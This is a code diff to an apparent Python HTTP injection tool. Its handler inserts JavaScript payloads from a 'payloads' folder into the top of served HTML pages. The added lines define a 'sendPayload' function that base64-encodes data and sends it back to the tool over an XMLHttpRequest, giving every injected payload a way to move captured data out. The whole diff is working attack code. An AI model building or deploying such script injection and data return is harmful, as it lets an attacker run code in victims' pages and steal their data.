@@ -20,13 +20,24 @@ class injectionHandler(BaseHTTPRequestHandler):
 		super().__init__(*args, **kwargs)
 
 	def inject(self,content):
+
+		payloadFunctions = """
+		function sendPayload(payload){
+			var xhr = new XMLHttpRequest(); 
+			payload = btoa(payload);
+			xhr.open('GET', '/payload/' + payload , true);
+			xhr.send();
+
+		}
+		"""
 		payload = open("payloads/" + self.payload + ".js",'r').read()
+
 		html = BeautifulSoup(content,features="html.parser")
 		if html.body:
 			script = html.new_tag(
 				"script",				
 				type='application/javascript')
-			script.string=payload
+			script.string=payloadFunctions + payload
 			html.body.insert(0, script)
 			return str(html).encode()
 		
